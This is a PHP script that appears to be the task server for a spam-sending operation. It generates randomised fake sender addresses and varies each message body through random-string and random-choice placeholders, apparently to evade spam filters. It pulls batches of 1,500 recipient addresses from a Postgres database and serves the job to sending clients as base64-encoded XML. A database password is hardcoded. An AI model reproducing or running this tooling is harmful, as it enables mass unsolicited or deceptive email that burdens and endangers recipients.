<?php
if(!isset($_GET['test']) && file_exists("stoped.txt"))
    die("EXIT;");

$tlds = array(".com",".net",".org",".eu",".biz");
$names = array("liam","emma","noah","olivia","william","ava","james","isabella","oliver","sophia","benjamin","charlotte","elijah","mia","lucas","amelia","mason","harper","logan","evelyn");
$lastnames = array("smith","johnson","williams","jones","brown","davis","miller","wilson","moore","taylor","anderson","thomas","jackson","white","harris","martin","thompson","garcia","martinez","robinson","clark","rodriguez","lewis","lee","walker","hall","allen","young","hernandez","king","wright","lopez","hill","scott","green","adams","baker","gonzalez","nelson","carter","mitchell","perez","roberts","turner","phillips","campbell","parker","evans","edwards","collins","stewart","sanchez","morris","rogers","reed","cook","morgan","bell","murphy","bailey","rivera","cooper","richardson","cox","howard","ward","torres","peterson","gray","ramirez","james","watson","brooks","kelly","sanders","price","bennett","wood","barnes","ross","henderson","coleman","jenkins","perry","powell","long","patterson","hughes","flores","washington","butler","simmons","foster","gonzales","bryant","alexander","russell","griffin","diaz","hayes","myers","ford","hamilton","graham","sullivan","wallace","woods","cole","west","jordan","owens","reynolds","fisher","ellis","harrison","gibson","mcdonald","cruz","marshall","ortiz","gomez","murray","freeman","wells","webb","simpson","stevens","tucker","porter");

$FromMail = $names[rand(0,count($names)-1)].".".$lastnames[rand(0,count($lastnames)-1)].rand(0,99)."@".$names[rand(0,count($names)-1)].$lastnames[rand(0,count($lastnames)-1)].$tlds[rand(0,count($tlds)-1)];
$HostName = gethostbyaddr($_SERVER["REMOTE_ADDR"]);

if(file_exists('data.template.xml'))
{
    $data = file_get_contents('data.template.xml');
    $data = str_replace("%FromMail%", base64_encode($FromMail), $data);
    $data = str_replace("%HostName%", base64_encode($HostName), $data);

    $datas = new SimpleXMLElement($data);
    $letter_ = base64_decode($datas->datas->data4);
    $letter_ = Replaces($letter_, '%%RandomWideStringAll', '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
    $letter_ = Replaces($letter_, '%%RandomWideStringUpper', '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ');
    $letter_ = Replaces($letter_, '%%RandomWideStringLower', '0123456789abcdefghijklmnopqrstuvwxyz');
    $letter_ = Replaces($letter_, '%%RandomNumbers', '0123456789');
    $letter_ = Replaces($letter_, '%%RandomStringUpper', 'ABCDEFGHIJKLMNOPQRSTUVWXYZ');
    $letter_ = Replaces($letter_, '%%RandomStringLower', 'abcdefghijklmnopqrstuvwxyz');

    ///
    $fact = RandomString(5, '123456789');
    $letter_ = str_replace('%%RandomFact', $fact, $letter_);
    $data = str_replace($datas->datas->data3, base64_encode(str_replace('%%RandomFact', $fact, base64_decode($datas->datas->data3))), $data);
    ///

    $letter_ = RandomSelect($letter_);

    if(isset($_GET['letter'])) die("From: ".base64_decode($datas->datas->data1)."<$FromMail><br>\r\nSubject: ".base64_decode($datas->datas->data3)."<br><br><br>\r\n\r\n".$letter_);

    $data = str_replace($datas->datas->data4, base64_encode($letter_) ,$data);

    //$mails = get_list("./lists/list.txt", "./lists/offset.txt", 1500, $x);
    $mails = get_list2(1500);
    $data = str_replace("%EmailList%", base64_encode($mails) , $data);

}
header('Content-type: text/xml'); 
echo $data;


function get_list2($count)
{

    $host = "localhost";
    $dbname = "sp1";
    $dbuser = "postgres";
    $userpass = "123+++xxx";
    $str = '';

    $con = pg_connect("host=$host dbname=$dbname user=$dbuser password=$userpass");
    if (!$con) die('Could not connect');

    $result = pg_query($con, 'UPDATE "sptb" SET status = 1, hour = '.time().' WHERE id in (SELECT id FROM "sptb" WHERE status = 0 LIMIT '.$count.' FOR UPDATE) RETURNING mail;') or die('Query failed: ' . pg_last_error());
    while ($line = pg_fetch_array($result, null, PGSQL_ASSOC)) {
        foreach ($line as $mail) {
            $str .= $mail."\r\n";
        }
    }
    return $str;
}
function RandomString($length = 10, $chars)
{
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $chars[rand(0, strlen($chars) - 1)];
    }
    return $randomString;
}
function Replaces($str, $find , $chars)
{
    while(($pos = strpos($str, $find)) !== false)
    {
        $arr = explode($find, $str);
        $arr = explode(")" , $arr[1]);
        $lenAdd = strlen($arr[0])+1;
        $arr = explode(",", str_replace(array(" ", "("), "", $arr[0]));
        $ran = RandomString(rand($arr[0], $arr[1]), $chars);
        $str = substr_replace($str, $ran, $pos, strlen($find)+$lenAdd);
    }
    return $str;
}
function RandomSelect($str, $find = "%%RandomSelect(")
{
    while(($pos = strpos($str, $find)) !== false)
    {
        $arr = explode($find, $str);
        $arr = explode(")" , $arr[1]);
        $lenAdd = strlen($arr[0])+1;
        $arr = explode("|", $arr[0]);
        $ran = $arr[rand(0, count($arr)-1)];
        $str = substr_replace($str, $ran, $pos, strlen($find)+$lenAdd);
    }
    return $str;
}

?>
